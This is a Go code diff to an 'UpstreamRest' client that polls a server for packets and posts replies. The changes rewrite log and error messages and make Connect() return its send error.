@@ -49,9 +49,9 @@ func (d *UpstreamRest) Connect() error {
 		if proxyUrl, err := url.Parse(proxyUrl); err == nil && proxyUrl.Scheme != "" && proxyUrl.Host != "" {
 			proxyUrlFunc := http.ProxyURL(proxyUrl)
 			http.DefaultTransport.(*http.Transport).Proxy = proxyUrlFunc
-			log.Infof("Using proxy: %s", proxyUrl)
+			log.Infof("UpstreamRest: Using proxy: %s", proxyUrl)
 		} else {
-			log.Warnf("Could not parse proxy %s: %s", proxyUrl, err.Error())
+			log.Warnf("UpstreamRest: Could not parse proxy %s (ignore): %s", proxyUrl, err.Error())
 		}
 	}
 
@@ -61,12 +61,10 @@ func (d *UpstreamRest) Connect() error {
 	packet := d.config.MakeClientPacket("ping", arguments, response)
 	err := d.sendPacket(*packet)
 	if err != nil {
-		log.WithFields(log.Fields{
-			"error": err,
-		}).Info("Error sending packet in Connect() via REST")
+		return err
 	}
 
-	return err
+	return nil
 }
 
 // Start is a Thread responsible for receiving packets from server, lifetime:app
@@ -84,9 +82,7 @@ func (d *UpstreamRest) Start() {
 					continue // no packets for us, maybe later
 				}
 
-				log.WithFields(log.Fields{
-					"error": err,
-				}).Debug("Error get packet")
+				log.Errorf("UpstreamRest: Could not get packet from server (ignore): %s", err.Error())
 
 				// Sleep and try again
 				continue
@@ -110,9 +106,7 @@ func (d *UpstreamRest) Start() {
 			// Send answer to server
 			err := d.sendPacket(packet)
 			if err != nil {
-				log.WithFields(log.Fields{
-					"error": err,
-				}).Info("Error sending packet from ChanOutgoing to server via REST")
+				log.Errorf("UpstreamRest: Could not send packet from ChanOutgoing to server via REST: %s", err.Error())
 			}
 		}
 	}()
@@ -122,15 +116,15 @@ func (d *UpstreamRest) GetPacket() (model.Packet, error) {
 	url := d.PacketGetUrl()
 	resp, err := d.HttpGet(url)
 	if err != nil {
-		return model.Packet{}, fmt.Errorf("Error requesting URL %s with error %s", url, err)
+		return model.Packet{}, fmt.Errorf("could not request URL %s: %s", url, err)
 	}
 	defer resp.Body.Close()
 	if resp.StatusCode != http.StatusOK {
-		return model.Packet{}, fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
+		return model.Packet{}, fmt.Errorf("could not request URL %s: status code is %d", url, resp.StatusCode)
 	}
 	bodyBytes, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		return model.Packet{}, fmt.Errorf("Error reading body of URL %s with error %s", url, err)
+		return model.Packet{}, fmt.Errorf("could not read body of HTTP response from URL %s: %s", url, err)
 	}
 
 	if len(bodyBytes) <= 0 {
@@ -138,7 +132,7 @@ func (d *UpstreamRest) GetPacket() (model.Packet, error) {
 	}
 	packet, err := d.coder.DecodeData(bodyBytes)
 	if err != nil {
-		return model.Packet{}, fmt.Errorf("Error decoding body of URL %s with error %s", url, err)
+		return model.Packet{}, fmt.Errorf("UpstreamRest: Error antnium decoding of body from URL %s: %s", url, err)
 	}
 	return packet, nil
 }
@@ -153,7 +147,7 @@ func (d *UpstreamRest) sendPacket(packet model.Packet) error {
 
 	data, err := d.coder.EncodeData(packet)
 	if err != nil {
-		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
+		return fmt.Errorf("could not send answer to URL %s: %s", url, err.Error())
 	}
 
 	resp, err := d.HttpPost(url, bytes.NewReader(data))
@@ -162,7 +156,7 @@ func (d *UpstreamRest) sendPacket(packet model.Packet) error {
 	}
 	defer resp.Body.Close()
 	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
+		return fmt.Errorf("HTTP response of URL %s has wrong statuscode %d", url, resp.StatusCode)
 	}
 
 	return nil
